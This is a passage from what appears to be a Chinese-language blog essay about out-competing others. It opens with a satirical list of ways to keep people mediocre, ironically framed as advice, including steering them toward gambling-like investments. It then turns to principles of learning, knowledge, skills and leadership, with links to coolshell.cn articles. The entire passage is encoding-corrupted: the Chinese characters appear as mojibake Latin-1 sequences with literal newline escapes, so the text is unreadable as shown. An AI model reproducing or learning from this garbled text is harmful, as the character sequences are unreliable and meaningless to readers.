æƒ¯åˆ©ç”¨ç¢ç‰‡æ—¶é—´åƒå¿«é¤åï¼Œä»–ä»¬å°±ä¼šå¤±å»ç²¾è¯»ä¸€æœ¬ä¹¦çš„è€æ€§â€¦â€¦**\n- ä¸æ–­åœ°ç»™ä»–ä»¬å„ç§å„æ ·â€œæœ‰ä»·å€¼çš„å­¦ä¹ èµ„æ–™â€ï¼Œè®©ä»–ä»¬æŠ“ä¸ä½é‡ç‚¹ï¼Œæˆä¸ºä¸€ä¸ªå¾®ä¿¡å…¬ä¼—å·æˆ–ç”µå­ä¹¦â€œæ”¶è—å®¶â€â€¦â€¦\n- è®©ä»–ä»¬çœ‹ä¸€äº›æ¯ç‡¥æ— å‘³çš„åŸºç¡€çŸ¥è¯†å’Œç¡¬æ ¸çŸ¥è¯†ï¼Œè¿™æ ·è®©ä»–ä»¬åªä¼šç”¨â€œæ­»è®°ç¡¬èƒŒâ€çš„æ–¹å¼æ¥å­¦ä¹ ï¼Œç”šè‡³ç›´æ¥è®©ä»–ä»¬å¤±å»ä¿¡å¿ƒï¼Œç›´æ¥æ”¾å¼ƒâ€¦â€¦\n- ç©å…·æ‰‹æªæ˜¯æ˜“ç”¨çš„ï¼Œé‡æ­¦å™¨æ˜¯éš¾ä»¥æ“æ§çš„ï¼Œå¤šç»™ä»–ä»¬ä¸€äº›ç©å…·ï¼Œè¿™æ ·ä»–ä»¬å°±ä¼šå¯¹ç©å…·ç©åœ°å¾—å¿ƒåº”æ‰‹ï¼Œè§‰å¾—ç©ç©å…·å°±æ˜¯è‡ªå·±çš„ä¸“ä¸šâ€¦â€¦\n- è®©ä»–ä»¬å–œæ¬¢ç›´æ¥å¾—åˆ°ç­”æ¡ˆçš„å·¥ä½œå’Œå­¦ä¹ æ–¹å¼ï¼Œæˆä¸ºä¸€ä¸ªä¼¸æ‰‹å…šï¼Œä»æ­¤å­¦ä¹ å†ä¹Ÿä¸æ€è€ƒâ€¦â€¦\n- å‘Šè¯‰ä»–ä»¬ä¸œè¥¿åšå‡ºæ¥å°±å¥½äº†ï¼Œä¸è¦è¿½æ±‚åšæ¼‚äº®ï¼Œåšä¼˜é›…ï¼Œè¿™æ ·ä»–ä»¬å°±ä¼šæ…¢æ…¢åœ°å˜æˆåŠ³åŠ¨å¯†é›†å‹â€¦â€¦\n- è®©ä»–ä»¬è§‰å¾—è‡ªå·±å·²ç»å¾ˆåŠªåŠ›äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯è¿æ°”ï¼Œå¹¶è¯´æœä»–ä»¬å»â€˜åŠæ—¶è¡Œä¹â€™ï¼Œç„¶åå†ä¹Ÿæ‰¾ä¸åˆ°é«˜é˜¶å’Œé«˜æ•ˆç‡å­¦ä¹ çš„æ„Ÿè§‰â€¦â€¦\n- è®©ä»–ä»¬è§‰å¾—â€œè¯»å®Œä¹¦â€ã€â€œè¯»è¿‡ä¹¦â€å°±è¡Œäº†ï¼Œä¸éœ€è¦å¯¹ä¹¦ä¸­çš„ä¸œè¥¿è¿›è¡Œæ€è€ƒï¼Œè¿›è¡Œæ€»ç»“ï¼Œæˆ–æ˜¯å®è·µï¼Œåªè¦å›«å›µåæ£å°½å¿«è¯»å®Œå°±ç­‰åŒäºå­¦å¥½äº†â€¦â€¦\n\næœ€åï¼Œåœ¨è®¤çŸ¥å’Œæ ¼å±€ä¸Šï¼Œå½»åº•æ‰“å®ä»–ä»¬ï¼Œè®©ä»–ä»¬å˜æˆéŸ­èœã€‚\n\n- è®©ä»–ä»¬ä¸è¦çœ‹åˆ°å¤§çš„å½¢åŠ¿ï¼Œåªçœ‹åˆ°çœ¼å‰çš„ä¸€äº©ä¸‰åˆ†åœ°ï¼Œåšå¥½ä¸€ä¸ªäº•åº•ä¹‹è›™ã€‚å…¶å®è¿™å¾ˆç®€å•ï¼Œæ¯”å¦‚ï¼Œä½ ä¸è¦è®©ä»–ä»¬çœ‹åˆ°æ•´ä¸ªè®¡ç®—æœºäº’è”ç½‘æŠ€æœ¯æ”¹å˜äººç±»ç¤¾ä¼šçš„è¶‹åŠ¿ï¼Œä½ è¦å¤šè®©ä»–çœ‹åˆ°ï¼Œä»äº‹è¿™ä¸€è¡Œä¸šçš„äººæœ‰å¤šè‹¦é€¼ï¼Œç„¶åå†è¯´ä¸€ä¸‹å…¶å®ƒè¡Œä¸šæˆ–èŒä¸šæœ‰å¤šå¥½â€¦â€¦\n- å®£æ‰¬ä¸€å¤œæš´å¯Œä»¥åŠå¿«é€ŸæŒ£é’±çš„æ¡ˆä¾‹ï¼Œ**æœ€å¥½è®©ä»–ä»¬è¿›å…¥â€œèµŒåšç±»â€æˆ–æ˜¯â€œä¼ é”€ç±»â€çš„åœ°æ–¹ï¼Œæ¯”å¦‚ï¼šè‚¡å¸‚ã€æ•°å­—è´§å¸â€¦â€¦è¦è®©ä»–ä»¬ç›¸ä¿¡å„ç§è´¢å¯Œç¥è¯ï¼Œç›¸ä¿¡ä»–ä»¬å°±æ˜¯é‚£ä¸ªå¹¸è¿å„¿ï¼Œ**ä»–ä»¬ä¹Ÿå¯ä»¥æˆä¸ºå·´è²ç‰¹ï¼Œå¯ä»¥æˆä¸ºé©¬äº‘â€¦â€¦\n- å‘Šè¯‰ä»–ä»¬ï¼Œä¸€äº›çœ‹ä¸Šå»å¾ˆéš¾çš„äº‹éƒ½æ˜¯æœ‰æ·å¾„çš„ï¼Œæ¯”å¦‚ï¼š21å¤©å°±èƒ½å­¦ä¼šæœºå™¨å­¦ä¹ ï¼Œç”¨åŒºå—é“¾å°±èƒ½é¢ è¦†ä»¥åŠé‡æ„æ•´ä¸ªä¸–ç•Œç­‰ç­‰â€¦â€¦\n- å¤šè·Ÿä»–ä»¬è®²ä¸€äº›å°äººç‰©çš„åŠ±å¿—çš„æ•…äº‹ï¼Œè¿™æ ·è®©ä»–ä»¬ç›¸ä¿¡ï¼Œä¸éœ€è¦å­¦ä¹ é«˜çº§çŸ¥è¯†ï¼Œä¸éœ€è¦æŒæ¡é«˜çº§æŠ€èƒ½ï¼Œåªéœ€è¦ç”¨ä½ç­‰çš„çŸ¥è¯†å’Œä½çº§çš„æŠ€èƒ½ï¼Œå†åŠ ä¸ŠæŒç»­ä¸æ–­æ‹¼å‘½é‡å¤ç°æœ‰çš„å·¥ä½œï¼Œç»ˆæœ‰ä¸€å¤©å°±ä¼šæˆåŠŸâ€¦â€¦\n- å¤šè®©ä»–ä»¬è·Ÿåˆ«äººæ¯”è¾ƒï¼Œ**äººæ¯”äººä¸ä¼šæ°”æ­»äººï¼Œä½†æ˜¯ä¼šè®©äººå˜å¾—æµ®èºï¼Œå˜å¾—å¿ƒæ€¥ï¼Œå˜å¾—ç„¦è™‘ï¼Œå½“ä¸€ä¸ªäººæ²¡æœ‰åŠæ³•æ§åˆ¶è‡ªå·±çš„æƒ…ç»ªï¼Œæ²¡æœ‰åŠæ³•è®©è‡ªå·±é™ä¸‹å¿ƒæ¥ï¼Œäººä¼šå¤±å»è€æ€§å’ŒåšæŒï¼Œå¼€å§‹å¥½å¤§å–œæ¬¢åŠŸï¼Œå¼€å§‹è£…é€¼ï¼Œå¼€å§‹æ­ªé—¨é‚ªé“å‰‘èµ°åé”‹â€¦â€¦**\n- è®©ä»–ä»¬åˆ°ä½“åˆ¶å†…çš„ä¸€äº›éå¸¸ç¨³å®šçš„åœ°æ–¹å·¥ä½œï¼Œè¿™æ ·ä»–ä»¬æ‹¥æœ‰ä¸æ€è¿›å–ã€æ€•æ‰¿æ‹…è´£ä»»ã€å®³æ€•çŠ¯é”™ã€å–œæ¬¢å·æ‡’ã€å¾—è¿‡ä¸”è¿‡çš„ç´ è´¨â€¦â€¦\n- è®©ä»–ä»¬åˆ°ä½“åˆ¶å¤–çš„é‚£äº›å–œæ¬¢æ‹¼å‘½å–œæ¬¢åŠ ç­çš„åœ°æ–¹å·¥ä½œï¼Œå‘Šè¯‰ä»–ä»¬çˆ±æ‹¼æ‰ä¼šèµ¢ï¼ŒåŠªåŠ›åŠ ç­æ˜¯ä¸€ç§ç¦æŠ¥ï¼Œé’æ˜¥å°±æ˜¯ç”¨æ¥æ‹¼çš„ï¼Œè®©ä»–ä»¬å–œæ¬¢ä¸Šä½¿è›®åŠ›çš„æ„Ÿè§‰â€¦â€¦\n- å‘Šè¯‰ä»–ä»¬ä½ çš„è¡Œä¸šå¤ªç´¯å¤ªè¾›è‹¦ï¼Œå¹²ä¸åˆ°30å²ã€‚è®©ä»–ä»¬æ—©ç‚¹è½¬è¡Œï¼Œä¸è¦è€½è¯¯äººç”Ÿå’Œé’æ˜¥â€¦â€¦\n- å½“ä»–ä»¬è¦åšå†³å®šçš„æ—¶å€™ï¼Œä¸€å®šè¦è®©ä»–ä»¬æ›´å¤šçš„å…³æ³¨è‡ªå·±ä¼šå¤±å»çš„ä¸œè¥¿ï¼Œè€Œä¸æ˜¯ä¼šå¾—åˆ°çš„ä¸œè¥¿ã€‚åŸ¹å…»ä»–ä»¬æ‚£å¾—æ‚£å¤±å¿ƒæ€ï¼Œè®©ä»–ä»¬è®¤è¯†ä¸åˆ°äº‹ç‰©çœŸæ­£çš„ä»·å€¼ï¼Œå¤±å»åˆ¤æ–­èƒ½åŠ›â€¦â€¦ï¼ˆæ¯”å¦‚ï¼šè®©ä»–ä»¬è§‰å¾—è·Ÿå¯¹äººæ‹é¢†å¯¼çš„é©¬å±å¿ äºå…¬å¸æ¯”è‡ªæˆ‘çš„æˆé•¿æ›´æœ‰ä»·å€¼ï¼‰\n- å‘Šè¯‰ä»–ä»¬ï¼Œä½ ç°æœ‰çš„æŠ€èƒ½å’ŒçŸ¥è¯†ä¸ç”¨æ›´æ–°ï¼Œå°±èƒ½è¿‡å¥½ä¸€è¾ˆå­ï¼Œæ–°å‡ºæ¥çš„ä¸œè¥¿æ²¡æœ‰ç”Ÿå‘½åŠ›çš„â€¦â€¦è¿™æ ·ä»–ä»¬å°±ä¼šåƒæˆ‘ä»¬å†ä¹Ÿä¸å­¦ä¹ çš„çˆ¶è¾ˆä¸€æ ·å¾ˆå¿«å°±ä¼šè¢«æ—¶ä»£æ‰€æŠ›å¼ƒâ€¦â€¦\n- **æ¯ä¸ªäººéƒ½å–œæ¬¢åœ¨ä¸€äº›è‡ªå·±åšä¸åˆ°çš„äº‹ä¸Šæ‰¾ç†ç”±ï¼Œè¿™ç§èƒ½åŠ›ä¸æ•™å°±ä¼š**ï¼Œæ¯”å¦‚ï¼Œäº‹æƒ…å¤ªå¤šæ²¡æœ‰æ—¶é—´ï¼Œå› ä¸ºå·¥ä½œä¸Šæ²¡æœ‰ç”¨åˆ°ï¼Œç­‰ç­‰ï¼Œä½ è¦åšçš„å°±æ˜¯å¸®ä»–ä»¬ä¸ºä»–ä»¬åšä¸åˆ°çš„äº‹æ‰¾å„ç§éå¸¸åˆç†çš„ç†ç”±ï¼Œæ¯”å¦‚ï¼šæ²¡äº‹çš„ï¼Œä¸€åˆ‡éƒ½æ˜¯æœ€å¥½çš„å®‰æ’ï¼›ä½ å¾—ä¸åˆ°çš„é‚£ä¸ªäº‹æ²¡ä»€ä¹ˆæ„æ€ï¼›ä½ æ²¡æœ‰é¢å¥½ä¸»è¦åŸå› æ˜¯é‚£ä¸ªé¢è¯•å®˜é—®çš„é—®é¢˜éƒ½æ˜¯å¯ä»¥ä¸Šç½‘æŸ¥å¾—åˆ°çš„çŸ¥è¯†ï¼Œè€Œä¸æ²¡æœ‰é—®åˆ°ä½ çœŸæ­£çš„èƒ½åŠ›ä¸Šï¼›è¿™äº›ä¸œè¥¿å­¦äº†ä¸ç”¨å¾ˆå¿«ä¼šå¿˜äº†ï¼Œç­‰æœ‰äº†ç¯å¢ƒå†å­¦ä¹Ÿä¸è¿Ÿâ€¦â€¦\n\n**æœ€åå‹æƒ…æç¤ºä¸€ä¸‹ï¼Œä¸Šè¿°çš„è¿™äº›â€œæœ€ä½³å®è·µâ€ä½ è¦å°å¿ƒï¼Œæ˜¯æ‰€è°“ï¼Œè´©æ¯’çš„äººä»æ¥ä¸å¸æ¯’ï¼Œå¼€èµŒåœºçš„äººä»æ¥ä¸èµŒåšï¼æ‰€ä»¥ï¼Œä½ è¦å°å¿ƒåˆ«è‡ªå·±ä¹Ÿæ‰è¿›å»äº†ï¼è¿™å°±æ˜¯â€œæ¬²ç»ƒç¥åŠŸï¼Œå¿…å…ˆè‡ªå®«â€çš„é“ç†ã€‚**\n\n\n\n### 2. ç›¸å…³åŸç†å’Œæ€ç»´æ¨¡å‹\n\nå¯¹äºä¸Šé¢çš„è¿™äº›æŠ€å·§è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šï¼Œä½ è‡ªå·±ä¹Ÿå¯ä»¥å‘æ˜æˆ–æ˜¯æ‰¾åˆ°å¾ˆå¤šã€‚æ‰€ä»¥ï¼Œæˆ‘æ¥è®²è®²è¿™å…¶ä¸­çš„ä¸€äº›åŸç†ã€‚\n\nä¸€èˆ¬æ¥è¯´ï¼Œè¶…è¿‡åˆ«äººä¸€èˆ¬æ¥è¯´å°±æ˜¯ä¸¤ä¸ªç»´åº¦ï¼š\n\n1. **åœ¨è®¤çŸ¥ã€çŸ¥è¯†å’ŒæŠ€èƒ½ä¸Š**ã€‚è¿™æ˜¯ä¸€ä¸ªäººèµ–ä»¥ç«‹è¶³ç¤¾ä¼šçš„èƒ½åŠ›ï¼ˆå‚çœ‹ã€Š[ç¨‹åºå‘˜çš„è’è°¬ä¹‹è¨€è¿˜æ˜¯è‡³ç†åè¨€ï¼Ÿ](https://coolshell.cn/articles/4235.html)ã€‹å’Œã€Š[21å¤©æ•™ä½ å­¦ä¼šC++](https://coolshell.cn/articles/2250.html)ã€‹ï¼‰\n2. **åœ¨é¢†å¯¼åŠ›ä¸Š**ã€‚æ‰€è°“é¢†å¯¼åŠ›å°±æ˜¯ä½ è·‘åœ¨åˆ«äººå‰é¢ï¼Œä½ å¾—è¦æœ‰æ¯”åˆ«äººæ›´å¥½çš„èƒ½åŠ›æ›´é«˜çš„æ ‡å‡†ï¼ˆå‚çœ‹ã€Š[æŠ€æœ¯äººå‘˜å‘å±•ä¹‹è·¯](https://coolshell.cn/articles/17583.html)ã€‹ï¼‰\n\né¦–å…ˆï¼Œæˆ‘ä»¬è¦æ˜ç™½ï¼Œäººçš„æŠ€èƒ½æ˜¯ä»è®¤è¯†å¼€å§‹ï¼Œç„¶åé€šè¿‡å­¦æ ¡ã€åŸ¹è®­æˆ–æ˜¯ä¹¦æœ¬æŠŠâ€œé›¶ç¢çš„è®¤çŸ¥â€è½¬æ¢æˆâ€œç³»ç»Ÿçš„çŸ¥è¯†â€ï¼Œè€Œæœ‰è¦æŠŠçŸ¥è¯†è½¬æ¢æˆæŠ€èƒ½ï¼Œå°±éœ€è¦è®­ç»ƒå’Œå®è·µï¼Œè¿™æ ·æ‰èƒ½å®Œæˆä»ï¼šè®¤è¯† -> çŸ¥è¯† -> æŠ€èƒ½ çš„è½¬æ¢ã€‚è¿™ä¸ªè½¬æ¢è¿‡ç¨‹æ˜¯éœ€è¦è€—è´¹å¾ˆå¤šæ—¶é—´å’Œç²¾åŠ›çš„ï¼Œè€Œä¸”å…¶ä¸­è¿˜éœ€è¦æœ‰å¼ºå¤§çš„å­¦ä¹ èƒ½åŠ›å’ŒåŠ¨æ‰‹èƒ½åŠ›ï¼Œè¿™æ¡è·¯å¾„ä¸Šæœ‰å¾ˆå¤šçš„â€œå…³å¡â€ï¼Œæ¯é“å…³å¡éƒ½ä¼šè¿‡æ»¤æ‰ä¸€å¤§éƒ¨åˆ†äººã€‚æ¯”å¦‚ï¼š**å¯¹äºä¸€äº›æ¯”è¾ƒæ¯ç‡¥çš„ç¡¬æ ¸çŸ¥è¯†æ¥è¯´ï¼Œ90%çš„äººåŸºæœ¬ä¸Šå°±å€’ä¸‹æ¥ï¼Œä¸æ˜¯å› ä¸ºä»–ä»¬æ²¡æœ‰æ™ºå•†ï¼Œè€Œæ˜¯ä»–ä»¬æ²¡æœ‰è€å¿ƒã€‚**\n\n##### è®¤çŸ¥\n\nè¦åœ¨è®¤çŸ¥ä¸Šè¶…è¿‡åˆ«äººï¼Œå°±è¦åœ¨ä¸‹é¢å‡ ä¸ªæ–¹é¢ä¸Šåšè¶³åŠŸå¤«ï¼š\n\n1ï¼‰**ä¿¡æ¯æ¸ é“**ã€‚è¯•æƒ³å¦‚æœåˆ«äººçš„ä¿¡æ¯æºæ²¡æœ‰ä½ çš„å¥½ï¼Œé‚£ä¹ˆï¼Œ**è¿™äº›çœ‹ä¸è§ä¿¡æ¯æºçš„äººï¼Œåªèƒ½æ¥è§¦å¾—åˆ°äºŒæ‰‹ä¿¡æ¯ç”šè‡³ä¸‰æ‰‹ä¿¡æ¯ï¼Œåªèƒ½è·å¾—è¢«åˆ«äººè§£è¯»è¿‡çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯è¢«ä¸‰ä¼ ä¸¤é€’åå¿…å®šä¼šæœ‰é”™è¯¯å’Œå¤±çœŸï¼Œç”šè‡³ä¼šè¢«ä¼ é€’ä¿¡æ¯çš„ä¸­é—´äººhackå…¶ä¸­çš„ä¿¡æ¯ï¼ˆä¹Ÿå°±æ˜¯â€œä¸­é—´äººæ”»å‡»â€ï¼‰ï¼Œè€Œè¿™äº›æ‰¾ä¸å‡ºä¿¡æ¯æºçš„äººï¼Œåªèƒ½â€œè¢«äººå–‚å…»â€ï¼Œäºæ˜¯ï¼Œä»–ä»¬æœ€ç»ˆä¼šè¢«å›°åœ¨ä¿¡æ¯çš„åº•å±‚ï¼Œæ°¸ä¸–ä¸å¾—ç¿»èº«ã€‚**ï¼ˆæ¯”å¦‚ï¼šå­¦ä¹ Cè¯­è¨€ï¼Œæ”¾ç€åŸä½œè€…K&Rçš„ä¸ç”¨ï¼Œç¡¬è¦ç”¨é”™è¯¯ç™¾å‡ºè°­æµ©å¼ºçš„ä¹¦ï¼Œèƒ½æœ‰ä»€ä¹ˆå¥½å‘¢ï¼Ÿï¼‰\n\n2ï¼‰**ä¿¡æ¯è´¨é‡**ã€‚ä¿¡æ¯è´¨é‡ä¸»è¦è¡¨ç°åœ¨ä¸¤ä¸ªæ–¹é¢ï¼Œä¸€ä¸ªæ˜¯ä¿¡æ¯ä¸­çš„ç‡¥éŸ³ï¼Œå¦ä¸€ä¸ªæ˜¯ä¿¡æ¯ä¸­çš„è´¨é‡ç­‰çº§ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œåœ¨å¤§æ•°æ®å¤„ç†ä¸­æœ‰ä¸€å¥åè¨€ï¼Œå« garbage in garbage outï¼Œä½ å¤©å¤©çœ‹çš„éƒ½æ˜¯åƒåœ¾ï¼Œä½ çš„æ€æƒ³å’Œè®¤è¯†ä¹Ÿåªæœ‰åƒåœ¾ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ çš„ä¿¡æ¯è´¨é‡å¹¶ä¸å¥½çš„è¯ï¼Œä½ çš„è®¤çŸ¥ä¹Ÿä¸ä¼šå¥½ï¼Œè€Œä¸”ä½ è¿˜è¦èŠ±å¤§é‡çš„æ—¶é—´æ¥è¿›è¡Œæœ‰ä»·å€¼ä¿¡æ¯çš„æŒ–æ˜å’Œå¤„ç†ã€‚\n\n3ï¼‰**ä¿¡æ¯å¯†åº¦**ã€‚ä¼˜è´¨çš„ä¿¡æ¯ï¼Œå¯†åº¦ä¸€èˆ¬éƒ½å¾ˆå¤§ï¼Œå› ä¸ºè¿™ç§ä¿¡æ¯ä¼šé€¼ç€ä½ å»å¹²è¿™ä¹ˆå‡ ä»¶äº‹ï¼Œaï¼‰æœç´¢å¹¶å­¦ä¹ å…¶å…³è”çš„çŸ¥è¯†ï¼Œbï¼‰æ²‰æ€å’Œåçœï¼Œcï¼‰äº²æ‰‹å»æ¨ç†ã€éªŒè¯å’Œå®è·µâ€¦â€¦ä¸€èˆ¬æ¥è¯´ï¼Œç»éªŒæ€§çš„æ–‡ç« ä¼šæ¯”çŸ¥è¯†æ€§çš„æ–‡ç« ä¼šæ›´æœ‰è¿™æ ·çš„åŠŸæ•ˆã€‚æ¯”å¦‚ï¼Œç±»ä¼¼äºåƒ Effiective C++/Javaï¼Œè®¾è®¡æ¨¡å¼ï¼ŒUnixç¼–ç¨‹è‰ºæœ¯ï¼Œç®—æ³•å¯¼è®ºç­‰ç­‰è¿™æ ·çš„ä¹¦å°±æ˜¯å±äºè¿™ç§å¯†åº¦å¾ˆå¤§çš„ä¹¦ï¼Œè€Œåƒ[Netflixçš„å®˜æ–¹blog](https://medium.com/netflix-techblog)å’Œ[AWS CTOçš„blog](https://www.allthingsdistributed.com/)ç­‰ç­‰åœ°æ–¹ä¹Ÿä¼šç»å¸¸æœ‰ä¸€äº›è¿™æ ·çš„æ–‡ç« ã€‚\n\n##### çŸ¥è¯†\n\nè¦åœ¨çŸ¥è¯†ä¸Šè¶…è¿‡åˆ«äººï¼Œä½ å°±éœ€è¦åœ¨ä¸‹é¢å‡ ä¸ªæ–¹é¢ä¸Šåšè¶³åŠŸå¤«ï¼š\n\n1ï¼‰**çŸ¥è¯†æ ‘ï¼ˆå›¾ï¼‰**ã€‚ä»»ä½•çŸ¥è¯†ï¼Œåªåœ¨ç‚¹ä¸Šå­¦ä¹ ä¸å¤Ÿçš„ï¼Œéœ€è¦åœ¨é¢ä¸Šå­¦ä¹ ï¼Œè¿™å«ç³»ç»Ÿåœ°å­¦ä¹ ï¼Œè¿™éœ€è¦æˆ‘ä»¬å»æ€»ç»“å¹¶å½’çº³çŸ¥è¯†æ ‘æˆ–çŸ¥è¯†å›¾ï¼Œä¸€ä¸ªçŸ¥è¯†é¢ä¼šæœ‰å¤šä¸ªçŸ¥è¯†æ¿å—ç»„æˆï¼Œä¸€ä¸ªæ¿å—åˆæœ‰å„ç§çŸ¥è¯†ç‚¹ï¼Œä¸€ä¸ªçŸ¥è¯†ç‚¹ä¼šå¯¼å‡ºå¦å¤–çš„çŸ¥è¯†ç‚¹ï¼Œå„ç§çŸ¥è¯†ç‚¹åˆä¼šäº¤å‰å’Œä¾èµ–èµ·æ¥ï¼Œå­¦ä¹ å°±æ˜¯è¦ç³»ç»Ÿåœ°å­¦ä¹ æ•´ä¸ªçŸ¥è¯†æ ‘ï¼ˆå›¾ï¼‰ã€‚è€Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ**å¯¹äºä¸€æ£µæ ‘æ¥è¯´ï¼Œâ€œæ ¹åŸºâ€æ˜¯éå¸¸é‡è¦çš„ï¼Œæ‰€ä»¥ï¼Œå­¦å¥½åŸºç¡€çŸ¥è¯†ä¹Ÿæ˜¯éå¸¸é‡è¦çš„ï¼Œå¯¹äºä¸€ä¸ªé™Œç”Ÿçš„åœ°æ–¹ï¼Œæœ‰ä¸€ä»½åœ°å›¾æ˜¯éå¸¸é‡è¦çš„ï¼Œæ²¡æœ‰åœ°å›¾çš„ä½ åªä¼šä¹±çªœï¼Œåªä¼šè¿·è·¯ã€ç»ƒè·¯ã€èµ°å†¤æ‰è·¯ï¼**\n\n2ï¼‰**çŸ¥è¯†ç¼˜ç”±**ã€‚ä»»ä½•çŸ¥è¯†éƒ½æ˜¯æœ‰ç¼˜ç”±çš„ï¼Œäº†è§£ä¸€ä¸ªçŸ¥è¯†çš„æ¥é¾™å»è„‰å’Œå‰ä¸–ä»Šç”Ÿï¼Œä¼šè®©ä½ å¯¹è¿™ä¸ªçŸ¥è¯†æœ‰éå¸¸å¼ºçš„æŒæ¡ï¼Œè€Œä¸å†åªæ˜¯é è®°å¿†å»å­¦ä¹ ã€‚é è®°å¿†å»å­¦ä¹ æ˜¯ä¸€ä»¶éå¸¸ç³Ÿç³•çš„äº‹ã€‚è€Œå¯¹äºä¸€äº›æ“ä½œæ€§çš„çŸ¥è¯†ï¼ˆä¸éœ€è¦äº†è§£ç”±æ¥çš„ï¼‰ï¼Œæˆ‘æŠŠå…¶å«æ“ä½œçŸ¥è¯†ï¼Œå°±åƒä¸€äº›å‡½æ•°åº“ä¸€æ ·ï¼Œè¿™æ ·çš„çŸ¥è¯†åªè¦å­¦ä¼šæŸ¥æ–‡æ¡£å°±å¥½äº†ã€‚**èƒ½å¤ŸçŸ¥å…¶ç„¶ï¼ŒçŸ¥å…¶æ‰€ä»¥ç„¶çš„äººè‡ªç„¶ä¼šæ¯”è¯†çŸ¥è¯†åˆ°è¡¨çš®çš„äººæ®µä½è¦é«˜å¾ˆå¤šã€‚**\n\n3ï¼‰**æ–¹æ³•å¥—è·¯**ã€‚å­¦ä¹ ä¸æ˜¯ä¸ºäº†æ‰¾åˆ°ç­”æ¡ˆï¼Œè€Œæ˜¯æ‰¾åˆ°æ–¹æ³•ã€‚å°±åƒæ•°å­¦ä¸€æ ·ï¼Œä½ å­¦çš„æ˜¯æ–¹æ³•ï¼Œæ˜¯è§£é¢˜æ€è·¯ï¼Œæ˜¯å¥—è·¯ï¼Œä¼šç”¨æ–¹ç¨‹å¼è§£é¢˜çš„å’Œä¸ä¼šç”¨æ–¹ç¨‹å¼è§£é¢˜çš„åœ¨è§£é¢˜æ•ˆç‡ä¸Šä¸å¯æ¯”è¾ƒï¼Œè€Œåœ¨å¾®ç§¯åˆ†é¢å‰ï¼Œå…¶å®ƒçš„è§£é¢˜æ–¹æ³•éƒ½å˜æˆäº†æ¸£æ¸£ã€‚**ä½ å¯ä»¥çœ‹åˆ°ï¼ŒæŒæ¡é«˜çº§æ–¹æ³•çš„äººæ¯”åˆ«äººçš„ä¼˜åŠ¿æœ‰å¤šå¤§ï¼Œå­¦ä¹ çš„ç›®çš„å°±æ˜¯ä¸ºäº†æŒæ¡æ›´ä¸ºé«˜çº§çš„æ–¹æ³•å’Œè§£é¢˜æ€è·¯**ã€‚\n\n##### æŠ€èƒ½\n\nè¦åœ¨æŠ€èƒ½ä¸Šè¶…è¿‡åˆ«äººï¼Œä½ å°±éœ€è¦åœ¨ä¸‹é¢å‡ ä¸ªæ–¹é¢åšè¶³åŠŸå¤«ï¼š\n\n1ï¼‰**ç²¾ç›Šæ±‚ç²¾**ã€‚å¦‚æœä½ æƒ³æ‹¥æœ‰ä¸“ä¸šçš„æŠ€èƒ½ï¼Œä½ è¦åšä¸ä»…ä»…æ˜¯æ‹¼å‘½åœ°é‡å¤ä¸€éåˆä¸€éçš„è®­ç»ƒï¼Œè€Œæ˜¯åœ¨æ¯ä¸€æ¬¡é‡å¤è®­ç»ƒæ—¶ä½ éƒ½è¦æ‰¾åˆ°æ›´å¥½çš„æ–¹æ³•ï¼Œæ€»ç»“ç»éªŒï¼Œè®©æ–°çš„ä¸€éèƒ½å¤Ÿæ›´å¥½ï¼Œæ›´æ¼‚äº®ï¼Œæ›´æœ‰æ•ˆç‡ï¼Œå¦åˆ™ï¼Œç”¨ç›¸åŒçš„æ–¹æ³•é‡å¤ï¼Œé‚£ä½ åªä¸è¿‡åœ¨æ¬ç –ç½¢äº†ã€‚\n\n2ï¼‰**è®©è‡ªå·±çŠ¯é”™**ã€‚çŠ¯é”™æ˜¯æœ‰åˆ©äºæˆé•¿çš„ï¼Œè¿™æ˜¯å› ä¸ºå‡ºé”™ä¼šè®©äººåæ€ï¼Œåæ€æ›´å¥½çš„æ–¹æ³•ï¼Œåæ€æ›´å®Œç¾çš„æ–¹æ¡ˆï¼Œæ€»ç»“æ•™è®­ï¼Œå¯»æ±‚æ›´å¥½æ›´å®Œç¾çš„è¿‡ç¨‹ï¼Œæ˜¯æŠ€èƒ½å‡çº§çš„æœ€å¥½çš„æ–¹å¼ã€‚å°¤å…¶æ˜¯å½“ä½ åœ¨å‡ºé”™åï¼Œè¢«äººé„™è§†ï¼Œè¢«äººå˜²ç¬‘åï¼Œä½ ä¼šæœ‰æ›´å¤§çš„åŠ¨åŠ›æå‡è‡ªå·±ï¼Œè¿™æ ·çš„åŠ¨åŠ›æ‰æ˜¯è¿›æ­¥çš„æºåŠ¨åŠ›ã€‚å½“ç„¶ï¼Œåƒä¸‡ä¸è¦åŒä¸€ä¸ªé”™è¯¯é‡å¤åœ°çŠ¯ï¼\n\n3ï¼‰**æ‰¾é«˜æ‰‹åˆ‡ç£‹**ã€‚ä¸‹è¿‡æ£‹ï¼Œæ‰“ä¸ªçƒçš„äººéƒ½çŸ¥é“ï¼Œä½ è¦æƒ³æå‡è‡ªå·±çš„æŠ€è‰ºï¼Œä½ å¿…éœ€æ‰¾é«˜æ‰‹åˆ‡ç£‹ï¼Œåœ¨å’Œé«˜æ‰‹åˆ‡ç£‹çš„è¿‡ç¨‹ä¸­ä½ ä¼šæ„Ÿå—åˆ°é«˜æ‰‹çš„æŠ€èƒ½å’Œæ–¹æ³•ï¼Œæœ‰æ—¶å€™ä½ ä¼šæƒ…ä¸è‡ªç¦åœ°å“‡åœ°ä¸€ä¸‹ï¼Œæˆ‘é ï¼Œè¿˜å¯ä»¥è¿™ä¹ˆç©ï¼\n\n##### é¢†å¯¼åŠ›\n\næœ€åä¸€ä¸ªæ˜¯é¢†å¯¼åŠ›ï¼Œè¦æœ‰é¢†å¯¼åŠ›æˆ–æ˜¯å½±å“åŠ›è¿™ä¸ªäº‹å¹¶ä¸å®¹æ˜“ï¼Œè¿™è·Ÿä½ çš„é‡å¿ƒæœ‰å¤šå¤§ï¼Œå¥½èƒœå¿ƒæœ‰å¤šå¼º ï¼Œä½ æ„¿æ„ä»˜å‡ºå¤šå°‘å¾ˆæœ‰å…³ç³»ï¼Œå› ä¸ºä¸€ä¸ªäººçš„é¢†å¯¼åŠ›è·Ÿä»–çš„æ ‡å‡†å¾ˆæœ‰å…³ç³»ï¼Œå› ä¸ºæœ‰é¢†å¯¼åŠ›çš„äººçš„æ 